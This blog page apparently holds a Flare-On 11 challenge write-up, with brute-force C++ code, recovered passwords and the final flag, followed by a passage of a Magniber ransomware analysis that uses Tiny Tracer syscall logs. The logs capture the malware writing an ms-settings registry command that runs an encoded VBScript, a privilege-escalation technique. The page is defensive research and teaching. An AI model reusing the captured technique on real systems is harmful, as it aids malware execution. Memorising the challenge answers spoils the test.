| 1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19<br>20<br>21<br>22<br>23<br>24<br>25<br>26<br>27<br>28<br>29<br>30<br>31<br>32<br>33<br>34<br>35 | `void``fill_pass(``BYTE``* _code,``char``* p)`<br>`{`<br>```size_t``indxs[] = { 5, 4, 12, 11, 19, 18, 26, 25, 33, 32, 40, 39, 47, 46, 54, 53 };`<br>```size_t``count =``sizeof``(indxs) /``sizeof``(indxs[0]);`<br>```if``(p) {`<br>```wchar_t``pass[32] = { 0 };`<br>```size_t``len =``strlen``(p);`<br>```for``(``size_t``i = 0; i < 32 && i < len; i++) {`<br>```pass[i] = p[i];`<br>```}`<br>```for``(``size_t``i = 0; i < count; i++) {`<br>```size_t``indx = indxs[i];`<br>```_code[indx] = pass[i];`<br>```}`<br>```}`<br>`}`<br>`int``to_process(``BYTE``* buf,``size_t``buf_size,``char``* pass)`<br>`{`<br>```DWORD``* dwBuf = (``DWORD``*)buf;`<br>```if``(dwBuf[0] !=``'BT4C'``) {`<br>```std::cerr <<``"Not a Catbert file\n"``;`<br>```return``(-1);`<br>```}`<br>```DWORD``dataSize = dwBuf[1];`<br>```DWORD``bytecodeOffset = dwBuf[2];`<br>```DWORD``bytecodeSize = dwBuf[3];`<br>```BYTE``* bytecodeBlock = (``BYTE``*)(``ULONGLONG``)(bytecodeOffset + (``ULONG_PTR``)buf);`<br>```*g_BytecodeBlockPtr = bytecodeBlock;`<br>```fill_pass(bytecodeBlock, pass);`<br>```return``process();`<br>`}` |

By observing the execution under the debugger, with different input, we can notice that there is another buffer where the data is written to and processed. Our input is written chunk by chunk, and various calculations are done on it.

![](https://hshrzd.wordpress.com/wp-content/uploads/2024/10/buf_content.png?w=579)

In addition to our custom, supplied password, yet another buffer is processed alongside. The content of that buffer is the same on each run, and independent of the input. However, it is different in case of different .c4tb files. We can suspect that this is the encrypted password.

Playing with different files, and different inputs, helped me to notice some interesting patterns. Since the verification proceeds in predictable ways, I realized that the correct passwords can be brutforced.

## Decrypting the cat memes

_Code of the full loader + brutforcer is available \[ [here](https://github.com/hasherezade/flareon2024/tree/main/task10/loader)\]_. _Compiled binary is available \[ [here](https://drive.google.com/file/d/1oVhGPH-LP9rt0iGAWXxFQUTOEMtIM1ft/view?usp=drive_link)\], password: `flare`_

**Case 1**

Looking at the output memory for the catmeme1.c4tb we can spot the encrypted password which looks pretty close to plaintext.

![](https://hshrzd.wordpress.com/wp-content/uploads/2024/10/cat1.png?w=619)

Only some characters are obfuscated. By poking around a little bit we can notice that the deobfuscated character is always loaded in the memory at a specific offset, and used for the comparison with our input.

![](https://hshrzd.wordpress.com/wp-content/uploads/2024/10/verify1.png?w=612)

If the particular character of the input password is the same – meaning, passed the verification – it will move to the next character.

![](https://hshrzd.wordpress.com/wp-content/uploads/2024/10/verify2.png?w=607)

Knowing that, we can simply dump the full password from memory, character by character. This is how I implemented the dumper:

|     |     |
| --- | --- |
| 1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17 | `bool``decodeCat1(``BYTE``* buf,``size_t``buf_size)`<br>`{`<br>```BYTE``* nextChar = g_BytecodeOut + 0xB0;`<br>```char``password[32] = { 0 };`<br>```::``memset``(password,``' '``, 30);`<br>```for``(``size_t``pos = 0; pos < 30; pos++) {`<br>```to_process(buf, buf_size, password);`<br>```if``(*g_ValidPass) {`<br>```std::cout <<``"PASS: "``<< password <<``"\n"``;`<br>```return``true``;`<br>```}`<br>```std::cout <<``"pass["``<< pos <<``"] = "``<< *nextChar <<``"\n"``;`<br>```password[pos] = *nextChar;`<br>```}`<br>```return``false``;`<br>`}` |

![](https://hshrzd.wordpress.com/wp-content/uploads/2024/10/pass1.png?w=472)

The final password: `DaCubicleLife101`

![](https://hshrzd.wordpress.com/wp-content/uploads/2024/10/meme1.png?w=456)

And it works! We got the first cat:

![](https://hshrzd.wordpress.com/wp-content/uploads/2024/10/catmeme1.jpg?w=499)

**Case 2**

The cases have a growing complexity, so it won’t be that easy with the second meme. However, also this case can be solved by understanding what is changing in the data memory when each character passed the verification.

![](https://hshrzd.wordpress.com/wp-content/uploads/2024/10/mem.png?w=618)

In this case, if our checked character passed, the next one will be loaded from our buffer at the specific position in memory. Knowing relevant offsets we can write a brutforcer that will try to change the character in the input password, till the cursor moved.

|     |     |
| --- | --- |
| 1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19<br>20<br>21<br>22<br>23<br>24<br>25<br>26<br>27<br>28<br>29<br>30<br>31 | `bool``brutforceCat2(``BYTE``* buf,``size_t``buf_size)`<br>`{`<br>```char``password[32] = { 0 };`<br>```BYTE``* processed = g_BytecodeOut + 0xC8;`<br>```BYTE``* encrypted = g_BytecodeOut + 0x90;`<br>```int``res = 0;`<br>```size_t``pos = 0;`<br>```bool``valFound =``true``;`<br>```for``(pos = 0; pos < 30 && valFound; pos++) {`<br>```valFound =``false``;`<br>```for``(``char``val = 0x20; val < 0x7e; val++) {`<br>```password[pos] = val;`<br>```res = to_process(buf, buf_size, password);`<br>```if``(*g_ValidPass) {`<br>```valFound =``true``;`<br>```break``;`<br>```}`<br>```if``(*processed != encrypted[pos]) {`<br>```std::cout <<``"pass["``<< pos <<``"] = "``<< val <<``"\n"``;`<br>```valFound =``true``;`<br>```break``;`<br>```}`<br>```}`<br>```}`<br>```if``(valFound) {`<br>```std::cout <<``"PASS: "``<< password <<``"\n"``;`<br>```}`<br>```return``valFound;`<br>`}` |

This gave me the next password: `G3tDaJ0bD0neM4te`.

![](https://hshrzd.wordpress.com/wp-content/uploads/2024/10/pass2.png?w=478)

And another cat meme:

![](https://hshrzd.wordpress.com/wp-content/uploads/2024/10/catmeme2.jpg?w=581)

**Case 3**

This is the last case, and as we can predict, it is gonna be the hardest. The characters are no longer checked one by one. Instead, some checksums are used. First two blocks are processed in groups of 4 characters. So the space of possible combinations is small enough, and it is still possible to brutforce.

|     |     |
| --- | --- |
| 1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19<br>20<br>21<br>22<br>23<br>24<br>25<br>26<br>27<br>28<br>29<br>30<br>31<br>32<br>33<br>34<br>35<br>36<br>37<br>38<br>39<br>40<br>41<br>42<br>43<br>44<br>45<br>46<br>47<br>48<br>49<br>50<br>51<br>52<br>53<br>54<br>55<br>56<br>57<br>58<br>59<br>60<br>61<br>62<br>63<br>64<br>65<br>66<br>67<br>68<br>69<br>70<br>71<br>72<br>73<br>74<br>75<br>76<br>77 | `bool``bruteCat3Chunk(``BYTE``* buf,``size_t``buf_size, std::vector<``char``> &charset,``char``*password,``char``defVal,``const``size_t``pos,``bool``breakOnFirst)`<br>`{`<br>```if``(pos >= 8)``return``false``;`<br>```const``size_t``chunkSize = 4;`<br>```char``foundChunk[chunkSize + 1] = { 0 };`<br>```::``memset``(foundChunk, defVal, chunkSize);`<br>```bool``isDone =``false``;`<br>```bool``anyFound =``false``;`<br>```BYTE``* nextBlock = g_BytecodeOut + 0xE0;`<br>``<br>```for``(``auto``itr1 = charset.begin(); !isDone && itr1 != charset.end(); ++itr1) {`<br>```for``(``auto``itr2 = charset.begin(); !isDone && itr2 != charset.end(); ++itr2) {`<br>```for``(``auto``itr3 = charset.begin(); !isDone && itr3 != charset.end(); ++itr3) {`<br>```for``(``auto``itr4 = charset.begin(); !isDone && itr4 != charset.end(); ++itr4) {`<br>```password[pos] = *itr1;`<br>```password[pos + 1] = *itr2;`<br>```password[pos + 2] = *itr3;`<br>```password[pos + 3] = *itr4;`<br>```to_process(buf, buf_size, password);`<br>```if``(*g_ValidPass) {`<br>```std::cout <<``"VALID\n"``;`<br>```isDone =``true``;`<br>```anyFound =``true``;`<br>```return``true``;`<br>```}`<br>```//`<br>```if``(*nextBlock == defVal) {`<br>```//printf("Next: %x\n", (*nextBlock));`<br>```::``memcpy``(foundChunk, password + pos, 4);`<br>```std::cout <<``"PASS Chunk["``<<pos <<``"]: "``<< foundChunk <<``"\n"``;`<br>```anyFound =``true``;`<br>``<br>```if``(breakOnFirst) {`<br>```isDone =``true``;`<br>```return``true``;`<br>```}`<br>``<br>```}`<br>```}`<br>```}`<br>```}`<br>```}`<br>```::``memcpy``(password + pos, foundChunk, chunkSize);`<br>```return``anyFound;`<br>`}`<br>`bool``brutforceCat3(``BYTE``* buf,``size_t``buf_size)`<br>`{`<br>```char``password[32] = { 0 };`<br>```int``res = 0;`<br>```char``defVal =``' '``;`<br>```std::vector<``char``> charset;`<br>```for``(``char``c =``'A'``; c <=``'Z'``; c++) {`<br>```charset.push_back(c);`<br>```}`<br>```for``(``char``c =``'a'``; c <=``'z'``; c++) {`<br>```charset.push_back(c);`<br>```}`<br>```::``memset``(password, defVal,``sizeof``(password) - 1);`<br>```size_t``pos = 0;`<br>```if``(!bruteCat3Chunk(buf, buf_size, charset, password, defVal, pos,``false``)) {`<br>```std::cout <<``"Failed!\n"``;`<br>```return``false``;`<br>```}`<br>```std::cout <<``"---\n"``;`<br>```pos = 4;`<br>```if``(!bruteCat3Chunk(buf, buf_size, charset, password, defVal, pos,``false``)) {`<br>```return``false``;`<br>```}`<br>```std::cout <<``"PASS: "``<< password <<``"\n"``;`<br>```return``true``;`<br>`}` |

The first chunk has multiple fitting options – but only one makes a coherent word, that is `VerY`. The second chunk has just one option, which is `DumB`. So we’ve got the beginning of the password: `VerYDumB`.

![](https://hshrzd.wordpress.com/wp-content/uploads/2024/10/pass3.png?w=474)

Now the things get harder – the remaining part of the password is not hashed in the same way – instead of 4, now 8 characters are processed in one go! It is gonna make the brutforce time inefficient. But, if we assume that the password is some common phrase, maybe we can guess the rest? Something very dumb on 8 characters… What can it be? Maybe… “password”?

And yes, `VerYDumBpassword` fits!

This is how we got the last meme:

![](https://hshrzd.wordpress.com/wp-content/uploads/2024/10/catmeme3.jpg?w=1022)

## Analyzing the EFI binary

So, since we decrypted all the memes, the remaining EFI file gets decrypted too:

![](https://hshrzd.wordpress.com/wp-content/uploads/2024/10/efi_dec.png?w=528)

The message suggests to run this binary. It can be done simply via shell.

![](https://hshrzd.wordpress.com/wp-content/uploads/2024/10/run_it.png?w=637)

It drops another file with .c4tb extension, and even gives a password to decrypt it: `BrainNumbFromVm!`.

Yet, at this point I was more interested in the binary itself, because I thought it has something hidden inside. So instead of proceeding, I carved the EFI executable out, and opened in IDA. Surprisingly, I didn’t find much more functionality than printing the welcome message, and dumping the encrypted file…

The file to be dropped can be found in plaintext, embedded inside the PE:

![](https://hshrzd.wordpress.com/wp-content/uploads/2024/10/embedded_file.png?w=439)

I know from the analysis that the files are encrypted by RC4, so I decided to just carve out the buffer with the last C4tB file, and decrypt it on my own, getting the following image as an output:

![](https://hshrzd.wordpress.com/wp-content/uploads/2024/10/your_mind.jpg?w=500)

Well, it looks like something is missing… `MigraineHypertensionStress@flare-on.com` is not the valid flag. On the other hand, the strings in the cat memes look like flag fragments, but yet incomplete. So where is the last part?

It turns out shouldn’t have decrypted that file on my own, but using the original `decrypt_file` utility.

So I went back to the VM and used the provided password to decrypt it. And this is what I’ve got:

![](https://hshrzd.wordpress.com/wp-content/uploads/2024/10/decrypt_last.png?w=486)

The final part of the flag, which is: `und3r_c0nstructi0n`.

Now we can piece the full flag together!

|     |     |
| --- | --- |
| 1 | `th3_ro4d_t0_succ3ss_1s_alw4ys_und3r_c0nstructi0n@flare-on.com` |

Posted in [CrackMe](https://hshrzd.wordpress.com/category/crackme/), [Tutorial](https://hshrzd.wordpress.com/category/tutorial/)\|Tagged [FlareOn](https://hshrzd.wordpress.com/tag/flareon/), [FlareOn11](https://hshrzd.wordpress.com/tag/flareon11/)\|[Leave a comment](https://hshrzd.wordpress.com/2024/10/27/flare-on-11-task-10/#respond)

## [Magniber ransomware analysis: Tiny Tracer in action](https://hshrzd.wordpress.com/2023/03/30/magniber-ransomware-analysis/)

Posted on [March 30, 2023](https://hshrzd.wordpress.com/2023/03/30/magniber-ransomware-analysis/ "9:39 pm") by[hasherezade](https://hshrzd.wordpress.com/author/hshrzd/ "View all posts by hasherezade")

## Intro

Magniber is a ransomware that was initially targeting South Korea. My first report on this malware was written for Malwarebytes in 2017 ( [here](https://www.malwarebytes.com/blog/news/2017/10/magniber-ransomware-exclusively-for-south-koreans)).

Since then, the ransomware was completely rewritten, and turned into a much more complex beast. The articles showing the timeline of the evolution of Magniber ransomware are available here: [Magniber at Malpedia](https://malpedia.caad.fkie.fraunhofer.de/details/win.magniber). In this writeup we will have a deep dive in a one of the samples from the updated edition.

**Note that the sample described here is not new**: it has been discovered in 2022 and analyzed by various researchers. Due to the fact that this malware uses raw syscalls, I decided that it is a good example to showcase [the new version of Tiny Tracer (v2.3)](https://github.com/hasherezade/tiny_tracer/releases), allowing to trace syscalls. However, this writeup is not limited to a short demo, but shows the analysis process step by step, from the beginning. Tiny Tracer will help us easily reach the hidden core of this obfuscated ransomware: the code directly responsible for the files encryption process.

* * *

## Analyzed sample

1. [7bb15a442a5aed5b2fa47eef3bc292e9](https://www.virustotal.com/gui/file/74e922ff426dc1146188fe48db8410ff720d2a2e8641af902a6891539ced6077/detection) – Original sample: the MSI installer
2. [796eb864005f3393c3adce70dc31d6ba](https://www.virustotal.com/gui/file/ba28c3d409daa2e3685673fe2dde9d8c93aec2b35c478fd66d4c407deceec63c) – the Magniber DLL
3. [882a21d7c07b3997d87e970f30110243](https://www.virustotal.com/gui/file/3a2b8ef624b4318fc142a6266c70f88799e80d10566f6dd2d8d74e91d651491a/detection) – the Magniber’s injector (shellcode#1)
4. [a841c3bf69df48f7b796752d7c86bc38](https://www.virustotal.com/gui/file/3a2b8ef624b4318fc142a6266c70f88799e80d10566f6dd2d8d74e91d651491a/detection) – the Magniber’s core (shellcode#2)

## Behavioral analysis

When executed, this rasomware runs silently, encrypting files with selected extensions, and appending its own extension at the end. In case of the currently analyzed sample, the added extention is ‘`vieijibfm`‘. In each directory with encrypted files, we can also find a ransom note: `README.html`.

![](https://hshrzd.wordpress.com/wp-content/uploads/2023/03/locked_example-1.png?w=308)

Visualization of an encrypted BMP file – before and after (created with the help of [file2png.py](https://github.com/hasherezade/crypto_utils/blob/master/file2png.py)):

![](https://hshrzd.wordpress.com/wp-content/uploads/2023/03/enc_square1.bmp.png?w=219)Before the encryption

![](https://hshrzd.wordpress.com/wp-content/uploads/2023/03/enc_square1-another-copy.bmp.vieijibfm.png?w=219)After the encryption by Magniber

The entropy of the encrypted file is high, and there are no patterns visible. This may suggest that some strong encryption was used, possibly AES with block chaining (CBC mode).

It drops, runs and then deletes a VBS script in `C:\Users\Public` , under a random name:

![](https://hshrzd.wordpress.com/wp-content/uploads/2023/03/dropped.png)

We can also find there two files with pseudorandom names, that are used as mutexes, to indidate that the encryption is running, or completed. At the end, the PNG file is dropped in the same directory:

![](https://hshrzd.wordpress.com/wp-content/uploads/2023/03/dropped_png.png)

After a while, the wallpaper gets changed to the dropped PNG, announcing the attack:

![](https://hshrzd.wordpress.com/wp-content/uploads/2022/12/encrypted.png?w=1024)

The information printed at the wallpaper mentions the ransom note `README.html` where the victim can find more information.

The content of the `README.html` has the following form:

![](https://hshrzd.wordpress.com/wp-content/uploads/2023/03/ransom_note-1-1.png)

It mentions further a Tor website, that can be used to make the contact with the attacker, and possibly buy the key for files decryption. At the time of this analysis, the website was not available.

While the extension added to the encrypted files didn’t change, and also occurs in the note, the used number at the beginning of the address is generated per attack.

Note that the ransom note is almost identical as the note used by the old Magniber’s version from 2017:

![](https://hshrzd.wordpress.com/wp-content/uploads/2023/03/ransom_note-1.png)

_Above: ransom note from the old Magniber’s edition (from 2017), full analysis at: [https://www.malwarebytes.com/blog/news/2017/10/magniber-ransomware-exclusively-for-south-koreans](https://www.malwarebytes.com/blog/news/2017/10/magniber-ransomware-exclusively-for-south-koreans)_

## Inside

### Upacking the MSI

Magniber sample comes packed in the MSI (Microsoft Installer). We can view the scripts inside with Microsoft’s tool, Orca MSI (mirror: [here](https://www.technipages.com/download-orca-msi-editor)).

![](https://hshrzd.wordpress.com/wp-content/uploads/2022/12/msi_pic.png?w=612)

By looking at the “Custom Action” we find out that the binary to be run is named “utskzc”, and the function that will be executed from there is “mvrtubhpxy”. In order to access that binary we need to unpack the content of the MSI package. We can do it with the help of 7zip.

Then we find out that the aforementioned binary is a PE file, and it exports the function “mvrtubhpxy”.

![](https://hshrzd.wordpress.com/wp-content/uploads/2022/12/export_table.png)

This is where the execution of the binary starts.

### Overview of Magniber’s DLL

If we try to open this binary in IDA, we can clearly see that this binary is obfuscated. The execution starts from a single call…

![](https://hshrzd.wordpress.com/wp-content/uploads/2023/03/inside_export.png?w=414)

…that leads into a “rabbithole” of jumps…

![](https://hshrzd.wordpress.com/wp-content/uploads/2023/03/jumps_list.png?w=735)

How can we analyze the ransomware inner workings, when it is so hard to even find the relevant code? It isn’t as hard as it seems if we involve DBI (Dynamic Binary Instrumentation) tools, such as Pin-based [Tiny Tracer](https://github.com/hasherezade/tiny_tracer).

### Tracing the first stage executable

Let’s dive into the sample by tracing it with [Tiny Tracer](https://github.com/hasherezade/tiny_tracer) (you can find the installation instructions [here](https://github.com/hasherezade/tiny_tracer/wiki/Installation)). To makes things easier, I converted the DLL into EXE (as described [here](https://hshrzd.wordpress.com/2016/07/21/how-to-turn-a-dll-into-a-standalone-exe/)), changing its entry point to the exported function (since the `DllMain` does not do much in this case, and the exported function takes no parameters, we should be able to simply redirect it).

However, on the attempt of tracing it, I’ve got an unpleasant surprise. The Pin Tracer terminated with an error:

```
Pin: pin-3.25-98650-8f6168173
Copyright 2002-2022 Intel Corporation.
E:  UPC Dispatcher: Unhandled internal exception in Pin or tool. ThreadId = 0 SysThreadId = 3348. Interruption context: IP: 0x0725c6ad0 SP: 0x001b0e290. Exception Code: RECEIVED_ACCESS_FAULT. Exception Address = 0x0725c6ad0. Access Type: READ. Access Address = 0x2792246e3. ExceptionFlags: 0x000000000
```

It is not very intuitive to guess what caused such error. Fortunately, from the previous experience I know what it could be: some corruptions in the PE format itself. By looking at the Magniber executable in [PE-bear](https://hshrzd.wordpress.com/pe-bear/), I found the suspected cause – malformed data directories:

![](https://hshrzd.wordpress.com/wp-content/uploads/2022/12/table.png?w=620)

I cleaned it up, by removing the invalid entries:

![](https://hshrzd.wordpress.com/wp-content/uploads/2022/12/cleaned_data_dir.png?w=580)

Then made another attempt. This time the tracing continues cleanly.

This is the fragment of the tracelog made with default Tiny Tracer’s settings:

```
f069;section: [.swicc]
10c4;called: ?? [13240000+0]
> 13240000+20;called: ?? [1324d000+53d]
> 13240000+55;called: ?? [13270000+0]
> 13240000+ca;called: ?? [13270000+0]
> 13240000+229;called: ?? [13330000+0]
> 13240000+272;called: ?? [13370000+0]
> 13240000+229;called: ?? [13390000+0]
> 13240000+272;called: ?? [133d0000+0]
```

It doesn’t give us much information, apart from the fact that the execution quickly switched to some newly allocated block of code (probably a shellcode or a section unpacked in memory). To get more details, make sure that following settings are set in TinyTracer.ini:

```
FOLLOW_SHELLCODES=3
TRACE_SYSCALL=True
```

This time we can see something more interesting – it turns out the malware uses raw syscalls!

```
f069;section: [.swicc]
ef24;SYSCALL:0x18(NtAllocateVirtualMemory)
10c4;called: ?? [14bd0000+0]
> 14bd0000+20;called: ?? [14bdd000+53d]
> 14bd0000+4ee;SYSCALL:0x18(NtAllocateVirtualMemory)
> 14bd0000+55;called: ?? [14be0000+0]
> 14bd0000+4ee;SYSCALL:0x18(NtAllocateVirtualMemory)
> 14bd0000+ca;called: ?? [14be0000+0]
> 14bd0000+4ee;SYSCALL:0x18(NtAllocateVirtualMemory)
> 14bd0000+229;called: ?? [14c90000+0]
> 14bd0000+4ee;SYSCALL:0x18(NtAllocateVirtualMemory)
> 14bd0000+272;called: ?? [14cd0000+0]
> 14bd0000+4ee;SYSCALL:0x18(NtAllocateVirtualMemory)
> 14bd0000+229;called: ?? [14cf0000+0]
> 14bd0000+4ee;SYSCALL:0x18(NtAllocateVirtualMemory)
[...]
```

At this point we can already read from the tracelog where the “rabbit hole” ends. The new memory is allocated (using the syscall), the content of shellcode is copied there, and executed. The execution is redirected to the shellcode at the RVA = `0x10c4` in the Magniber’s executable. We can set the breakpoint at this offset in a debugger, and dump this shellcode for further analysis (it is [shellcode#1](https://www.virustotal.com/gui/file/3a2b8ef624b4318fc142a6266c70f88799e80d10566f6dd2d8d74e91d651491a/detection)).

But for now, let’s continue with the tracing of the main executable, and see what we can learn from it…

There are some back-and-forth calls between the different pieces of a shellcode, so, in order to avoid the noise, I am gonna filter it out by changing yet another option in TinyTracer.ini:

```
LOG_SHELLCODES_TRANSITIONS=False
```

And we can try tracing it again. This is what I got this time:

```
f069;section: [.swicc]
ef24;SYSCALL:0x18(NtAllocateVirtualMemory)
10c4;called: ?? [14bd0000+0]
> 14bd0000+4ee;SYSCALL:0x18(NtAllocateVirtualMemory)
> 14be0000+8;SYSCALL:0x36(NtQuerySystemInformation)
> 14bd0000+4ee;SYSCALL:0x18(NtAllocateVirtualMemory)
> 14be0000+8;SYSCALL:0x36(NtQuerySystemInformation)
> 14bd0000+4ee;SYSCALL:0x18(NtAllocateVirtualMemory)
> 14c90000+8;SYSCALL:0x34(NtDelayExecution)
> 14bd0000+4ee;SYSCALL:0x18(NtAllocateVirtualMemory)
> 14cd0000+8;SYSCALL:0x26(NtOpenProcess)
> 14bd0000+4ee;SYSCALL:0x18(NtAllocateVirtualMemory)
> 14cf0000+8;SYSCALL:0x34(NtDelayExecution)
> 14bd0000+4ee;SYSCALL:0x18(NtAllocateVirtualMemory)
> 14d30000+8;SYSCALL:0x26(NtOpenProcess)
> 14bd0000+4ee;SYSCALL:0x18(NtAllocateVirtualMemory)
> 14d70000+8;SYSCALL:0x34(NtDelayExecution)
> 14bd0000+4ee;SYSCALL:0x18(NtAllocateVirtualMemory)
> 14d80000+8;SYSCALL:0x26(NtOpenProcess)
> 14bd0000+4ee;SYSCALL:0x18(NtAllocateVirtualMemory)
> 14d90000+8;SYSCALL:0x34(NtDelayExecution)
> 14bd0000+4ee;SYSCALL:0x18(NtAllocateVirtualMemory)
> 14da0000+8;SYSCALL:0x26(NtOpenProcess)
> 14bd0000+4ee;SYSCALL:0x18(NtAllocateVirtualMemory)
[...]
> 170f7000+6cb;SYSCALL:0x8(NtWriteFile)
> 170f7000+6b5;SYSCALL:0xf(NtClose)
> 170f7000+6aa;SYSCALL:0x34(NtDelayExecution)
> 170f2000+cc3;ntdll.RtlCreateProcessParametersEx
> 170f7000+67e;SYSCALL:0x18(NtAllocateVirtualMemory)
> 170f7000+841;SYSCALL:0xc8(NtCreateUserProcess)
```

Complete tracelog available here: [magni.tag](https://gist.github.com/hasherezade/aa969e7c431023afabffef9f881616c2)

At the end PIN dumped `pin.log` file informing about an error:

```
Pin: pin-3.26-98690-1fc9d60e6
Copyright 2002-2022 Intel Corporation.
A: C:\tmp_proj\pinjen\workspace\pypl-pin-nightly\GitPin\Source\pin\vm_w\follow_child_windows.cpp: LEVEL_VM::WIN_FOLLOW_CHILD::NotifyAfterCreateUserProcess: 129: assertion failed: suspended
```

This time the error informs that the traced process created a child, which Tiny Tracer failed to follow (indeed we can see in the log file the last called function is `NtCreateUserProcess`). This situation is normal.

As we can see, the majority of the logged functions are called by syscalls. There are just a few functions here and there that are called directly from a DLL, such as `RtlCreateProcessParametersEx`, `RtlInitUnicodeString`.

The next thing that we can do in order to get more information about what is going on, is to dump arguments of the functions. This can be easily done with Tiny Tracer, by editing **_params.txt_** list ( [more info on project Wiki](https://github.com/hasherezade/tiny_tracer/wiki/Tracing-parameters-of-functions)). Since Tiny Tracer v2.3 we can also [log syscalls arguments](https://github.com/hasherezade/tiny_tracer/wiki/Tracing-syscalls). In this case, we will log the syscalls arguments referencing them by the corresponding functions from NTDLL.

I prepared a list relevant for the above tracelog (gist: [params.txt](https://gist.github.com/hasherezade/19aee3fedb8f1c0b62c4f62cddf752eb)):

```
ntdll;RtlCreateProcessParametersEx;10
ntdll;RtlInitUnicodeString;2
ntdll;NtAllocateVirtualMemory;6
ntdll;NtQuerySystemInformation;4
ntdll;NtOpenProcess;4
ntdll;NtWriteVirtualMemory;5
ntdll;NtCreateThreadEx;11
ntdll;NtResumeThread;2
ntdll;NtQueryPerformanceCounter;2
ntdll;NtOpenFile;6
ntdll;NtQueryVolumeInformationFile;5
ntdll;NtOpenKey;3
ntdll;NtEnumerateKey;6
ntdll;NtWriteFile;9
ntdll;NtSetValueKey;6
ntdll;NtCreateUserProcess;10
ntdll;NtCreateFile;10
```

I traced it again, with the changed settings. This time tracelog revealed the strings that were referenced by this functions. Fragment:

```
[...]
> 17353000+df9;ntdll.RtlInitUnicodeString
RtlInitUnicodeString:
	Arg[0] = ptr 0x00000000174bf900 -> U"\Registry\User\"
	Arg[1] = ptr 0x0000000017c80000 -> L"AppX04g0mbrz4mkc6e879rpf6qk6te730jfv"

> 17357000+6f7;SYSCALL:0x12(NtOpenKey)
NtOpenKey:
	Arg[0] = ptr 0x00000000174bf8f0 -> {\xff\xff\xff\xff\xff\xff\xff\xff}
	Arg[1] = ptr 0x00000000000f003f -> {\x00@.\x9a\x02\x00\x00\x00}
	Arg[2] = ptr 0x00000000174bf910 -> L"0"

> 17353000+e4e;ntdll.RtlInitUnicodeString
RtlInitUnicodeString:
	Arg[0] = ptr 0x00000000174bf900 -> U"AppX04g0mbrz4mkc6e879rpf6qk6te730jfv"
	Arg[1] = ptr 0x00000000174bf9c0 -> L"Shell"

> 17357000+6f7;SYSCALL:0x12(NtOpenKey)
NtOpenKey:
	Arg[0] = ptr 0x00000000174bf8f0 -> {\x04\x02\x00\x00\x00\x00\x00\x00}
	Arg[1] = ptr 0x00000000000f003f -> {\x00@.\x9a\x02\x00\x00\x00}
	Arg[2] = ptr 0x00000000174bf910 -> L"0"

> 17353000+ea2;ntdll.RtlInitUnicodeString
RtlInitUnicodeString:
	Arg[0] = ptr 0x00000000174bf900 -> U"Shell"
	Arg[1] = ptr 0x00000000174bf9b0 -> L"Open"

> 17357000+6f7;SYSCALL:0x12(NtOpenKey)
NtOpenKey:
	Arg[0] = ptr 0x00000000174bf8f0 -> {\x08\x02\x00\x00\x00\x00\x00\x00}
	Arg[1] = ptr 0x00000000000f003f -> {\x00@.\x9a\x02\x00\x00\x00}
	Arg[2] = ptr 0x00000000174bf910 -> L"0"

> 17353000+ef6;ntdll.RtlInitUnicodeString
RtlInitUnicodeString:
	Arg[0] = ptr 0x00000000174bf900 -> U"Open"
	Arg[1] = ptr 0x00000000174bf9e0 -> L"command"

> 17357000+6f7;SYSCALL:0x12(NtOpenKey)
NtOpenKey:
	Arg[0] = ptr 0x00000000174bf8f0 -> {\x0c\x02\x00\x00\x00\x00\x00\x00}
	Arg[1] = ptr 0x00000000000f003f -> {\x00@.\x9a\x02\x00\x00\x00}
	Arg[2] = ptr 0x00000000174bf910 -> L"0"

> 17353000+f49;ntdll.RtlInitUnicodeString
RtlInitUnicodeString:
	Arg[0] = ptr 0x00000000174bf900 -> U"command"
	Arg[1] = ptr 0x00000000174bfaf0 -> {\x00\x00\x00\x00\x00\x00\x00\x00}

> 17357000+70d;SYSCALL:0x60(NtSetValueKey)
NtSetValueKey:
	Arg[0] = 0x0000000000000210 = 528
	Arg[1] = ptr 0x00000000174bf900 -> {\x00\x00\x02\x00\x00\x00\x00\x00}
	Arg[2] = 0
	Arg[3] = 0x0000000000000001 = 1
	Arg[4] = ptr 0x0000000017bd0000 -> L"wscript.exe /B /E:VBScript.Encode ../../Users/Public/vybmaryqycp.mnxu"
	Arg[5] = 0x000000000000008a = 138

> 17353000+f86;ntdll.RtlInitUnicodeString
RtlInitUnicodeString:
	Arg[0] = ptr 0x00000000174bf900 -> {\x00\x00\x02\x00\x00\x00\x00\x00}
	Arg[1] = ptr 0x00000000174bfa28 -> L"DelegateExecute"

> 17357000+70d;SYSCALL:0x60(NtSetValueKey)
NtSetValueKey:
	Arg[0] = 0x0000000000000210 = 528
	Arg[1] = ptr 0x00000000174bf900 -> U"DelegateExecute"
	Arg[2] = 0
	Arg[3] = 0x0000000000000001 = 1
	Arg[4] = ptr 0x00000000174bfaf0 -> {\x00\x00\x00\x00\x00\x00\x00\x00}
	Arg[5] = 0x0000000000000004 = 4

> 17357000+6b5;SYSCALL:0xf(NtClose)
> 17357000+689;SYSCALL:0x1e(NtFreeVirtualMemory)
> 17354000+1b;ntdll.RtlInitUnicodeString
RtlInitUnicodeString:
	Arg[0] = ptr 0x00000000174bf900 -> U"DelegateExecute"
	Arg[1] = ptr 0x00000000174bf9f0 -> L"ms-settings"

> 17357000+718;SYSCALL:0x1d(NtCreateKey)
> 17354000+87;ntdll.RtlInitUnicodeString
RtlInitUnicodeString:
	Arg[0] = ptr 0x00000000174bf900 -> U"ms-settings"
	Arg[1] = ptr 0x00000000174bf9d0 -> L"CurVer"

> 17357000+718;SYSCALL:0x1d(NtCreateKey)
> 17354000+f4;ntdll.RtlInitUnicodeString
RtlInitUnicodeString:
	Arg[0] = ptr 0x00000000174bf900 -> U"CurVer"
	Arg[1] = ptr 0x00000000174bfaf0 -> {\x00\x00\x00\x00\x00\x00\x00\x00}

> 17357000+70d;SYSCALL:0x60(NtSetValueKey)
NtSetValueKey:
	Arg[0] = 0x0000000000000214 = 532
	Arg[1] = ptr 0x00000000174bf900 -> {\x00\x00\x02\x00\x00\x00\x00\x00}
	Arg[2] = 0
	Arg[3] = 0x0000000000000001 = 1
